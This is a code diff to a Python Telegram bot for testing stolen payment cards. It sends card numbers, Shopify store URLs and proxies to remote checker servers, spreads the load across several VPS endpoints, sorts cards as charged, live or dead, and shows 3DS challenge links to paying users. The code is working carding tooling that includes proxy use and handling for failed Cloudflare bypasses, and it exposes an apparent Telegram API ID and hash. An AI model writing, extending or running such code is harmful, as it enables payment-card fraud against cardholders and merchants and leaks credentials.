@@ -10,7 +10,18 @@ import re
 from datetime import datetime, timedelta
 
 # ========== CONFIGURATION ==========
-CHECKER_API_URL = 'http://177.7.59.185:5000/shopify'
+# Multi-VPS round-robin API endpoints – replace placeholders with real IPs
+API_ENDPOINTS = [
+    'http://VPS1_IP:5000/shopify',
+    'http://VPS2_IP:5000/shopify',
+]
+_api_endpoint_counter = 0
+
+def get_next_api_endpoint():
+    global _api_endpoint_counter
+    endpoint = API_ENDPOINTS[_api_endpoint_counter % len(API_ENDPOINTS)]
+    _api_endpoint_counter += 1
+    return endpoint
 
 API_ID = 36806590
 API_HASH = 'efb36a882a876315c7eebff3ee1da277'
@@ -505,6 +516,7 @@ _DEAD_INDICATORS = (
     'url rejected', 'malformed input', 'amount_too_small', 'amount too small',
     'site dead', 'captcha_required', 'captcha required', 'site errors', 'failed',
     'all products sold out', 'no_session_token', 'tokenize_fail',
+    'generic_error', 'empty_submit_response',
 )
 
 def extract_cc(text):
@@ -551,35 +563,34 @@ async def check_card(card, site, proxy):
 
         params = {'cc': card, 'site': site, 'proxy': proxy}
         timeout = aiohttp.ClientTimeout(total=120)
+        api_url = get_next_api_endpoint()
         async with aiohttp.ClientSession(timeout=timeout) as session:
-            async with session.get(CHECKER_API_URL, params=params) as resp:
+            async with session.get(api_url, params=params) as resp:
                 raw = await resp.json(content_type=None)
 
         response_msg = raw.get('Response', '')
         price = raw.get('Price', '-')
-        gate = raw.get('Gate', 'Shopify Payments')
-        status = raw.get('Status', '')
+        gateway = raw.get('Gateway', 'Shopify Payments')
+        api_status = raw.get('Status', False)   # boolean from new API
+        challenge_url = raw.get('challenge_url', None)
 
         if is_dead_site_error(response_msg):
-            return {'status': 'Site Error', 'message': response_msg, 'card': card, 'retry': True, 'gateway': gate, 'price': price}
+            return {'status': 'Site Error', 'message': response_msg, 'card': card, 'retry': True, 'gateway': gateway, 'price': price}
 
         response_lower = response_msg.lower()
 
-        if status == 'Charged' or 'order completed' in response_lower or '💎' in response_msg or 'order_placed' in response_lower or 'ORDER_PLACED' in response_msg:
-            return {'status': 'Charged', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
-        elif 'cloudflare bypass failed' in response_lower:
-            return {'status': 'Site Error', 'message': 'Cloudflare spotted', 'card': card, 'retry': True, 'gateway': gate, 'price': price}
-        elif 'thank you' in response_lower or 'payment successful' in response_lower:
-            return {'status': 'Charged', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
-        elif status == 'Approved' or any(key in response_lower for key in [
-            'approved', 'success', 'insufficient_funds', 'insufficient funds',
-            'invalid_cvv', 'incorrect_cvv', 'invalid_cvc', 'incorrect_cvc',
-            'invalid cvv', 'incorrect cvv', 'invalid cvc', 'incorrect cvc',
-            'incorrect_zip', 'incorrect zip'
-        ]):
-            return {'status': 'Approved', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
+        if 'cloudflare bypass failed' in response_lower:
+            return {'status': 'Site Error', 'message': 'Cloudflare spotted', 'card': card, 'retry': True, 'gateway': gateway, 'price': price}
+
+        # Map new API boolean Status + Response to internal statuses
+        if api_status is True or api_status == 'True' or api_status == 'true':
+            if response_msg == 'ORDER_PLACED' or 'order_placed' in response_lower or 'order completed' in response_lower or 'thank you' in response_lower or 'payment successful' in response_lower:
+                return {'status': 'Charged', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price}
+            else:
+                # Live card (3DS_REQUIRED, INSUFFICIENT_FUNDS, etc.)
+                return {'status': 'Approved', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price, 'challenge_url': challenge_url}
         else:
-            return {'status': 'Dead', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
+            return {'status': 'Dead', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price}
 
     except asyncio.TimeoutError:
         return {'status': 'Site Error', 'message': 'Request timeout', 'card': card, 'retry': True}
@@ -716,8 +727,9 @@ async def test_site(site, proxy):
     try:
         params = {'cc': test_card, 'site': site, 'proxy': proxy}
         timeout = aiohttp.ClientTimeout(total=60)
+        api_url = get_next_api_endpoint()
         async with aiohttp.ClientSession(timeout=timeout) as session:
-            async with session.get(CHECKER_API_URL, params=params) as resp:
+            async with session.get(api_url, params=params) as resp:
                 raw = await resp.json(content_type=None)
         response_msg = raw.get('Response', '').lower()
         if is_dead_site_error(response_msg):
@@ -732,8 +744,9 @@ async def test_proxy(proxy):
     try:
         params = {'cc': test_card, 'site': test_site_url, 'proxy': proxy}
         timeout = aiohttp.ClientTimeout(total=60)
+        api_url = get_next_api_endpoint()
         async with aiohttp.ClientSession(timeout=timeout) as session:
-            async with session.get(CHECKER_API_URL, params=params) as resp:
+            async with session.get(api_url, params=params) as resp:
                 raw = await resp.json(content_type=None)
         response_msg = raw.get('Response', '').lower()
         if 'proxy dead' in response_msg or 'invalid proxy format' in response_msg or 'no proxy' in response_msg:
@@ -1498,7 +1511,7 @@ async def single_cc_check(event):
         
         success, new_credits = deduct_credit(user_id)
         
-        if result['status'] == 'Charged' or 'order completed' in result.get('message', '').lower() or '💎' in result.get('message', '') or 'order_placed' in result.get('message', '').lower() or 'ORDER_PLACED' in result.get('message', ''):
+        if result['status'] == 'Charged':
             status_emoji = "✅"
             status_text = "𝐂𝐡𝐚𝐫𝐠𝐞𝐝"
             hit_type = "CHARGED"
@@ -1520,7 +1533,10 @@ async def single_cc_check(event):
         
         remaining_credits = get_user_credits(user_id)
         
-       
+        challenge_line = ""
+        challenge_url = result.get('challenge_url')
+        if challenge_url and result['status'] == 'Approved':
+            challenge_line = f"\n<blockquote>🔗 3DS URL: {challenge_url}</blockquote>"
         
         final_resp = f"""<b>⚡💳 #𝐒𝐇𝐎𝐏𝐈𝐅𝐘 💳⚡</b>
 <b>━━━━━━━━━━━━━━━━━</b>
@@ -1528,7 +1544,7 @@ async def single_cc_check(event):
 <blockquote>{status_emoji} Status: {status_text}</blockquote>
 <blockquote>💳 Card: <code>{card}</code></blockquote>
 <blockquote>📝 Response: {result['message'][:150]}</blockquote>
-<blockquote>🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {result.get('gateway', 'Unknown')} | 💰 {result.get('price', '-')}</blockquote>
+<blockquote>🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {result.get('gateway', 'Unknown')} | 💰 {result.get('price', '-')}</blockquote>{challenge_line}
 <b>━━━━━━━━━━━━━━━━━</b>
 <b>🎯💠 𝐁𝐈𝐍 𝐈𝐧𝐟𝐨</b>
 <pre>𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
@@ -1617,6 +1633,7 @@ async def check_command(event):
         
         last_update_count = 0
         UPDATE_EVERY_CARDS = 10
+        api_semaphore = asyncio.Semaphore(5)
         
         async def worker():
             nonlocal last_update_count
@@ -1640,13 +1657,14 @@ async def check_command(event):
                 if not current_sites or not current_proxies:
                     break
                 
-                res = await check_card_with_retry(card, current_sites, current_proxies, max_retries=1)
+                async with api_semaphore:
+                    res = await check_card_with_retry(card, current_sites, current_proxies, max_retries=1)
                 
                 all_results['checked'] += 1
                 
                 success, new_credits = deduct_credit(user_id)
                 
-                is_charged = res['status'] == 'Charged' or 'order completed' in res.get('message', '').lower() or '💎' in res.get('message', '') or 'order_placed' in res.get('message', '').lower() or 'ORDER_PLACED' in res.get('message', '')
+                is_charged = res['status'] == 'Charged'
                 
                 if is_charged:
                     all_results['charged'].append(res)
